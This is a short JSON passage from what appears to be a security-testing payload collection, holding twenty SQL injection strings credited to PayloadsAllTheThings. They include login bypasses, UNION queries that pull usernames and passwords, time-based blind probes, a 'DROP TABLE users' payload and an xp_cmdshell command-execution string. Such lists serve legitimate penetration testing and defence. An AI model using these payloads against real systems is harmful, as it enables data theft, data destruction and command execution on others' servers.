{
  "SQL Injection": {
    "category": "SQL Injection",
    "source": "PayloadsAllTheThings",
    "description": "SQL Injection payloads for testing database query manipulation vulnerabilities",
    "payloads": [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "'; DROP TABLE users; --",
      "1' ORDER BY 1--",
      "1' ORDER BY 2--",
      "1' ORDER BY 3--",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "1' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT username, password FROM users--",
      "1 AND 1=1",
      "1 AND 1=2",
      "1' AND SLEEP(5)--",
      "1'; WAITFOR DELAY '0:0:5'--",
      "'; EXEC xp_cmdshell('whoami')--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "admin'--",
      "admin' #",
      "' OR 1=1 LIMIT 1 --"
    ]
  },
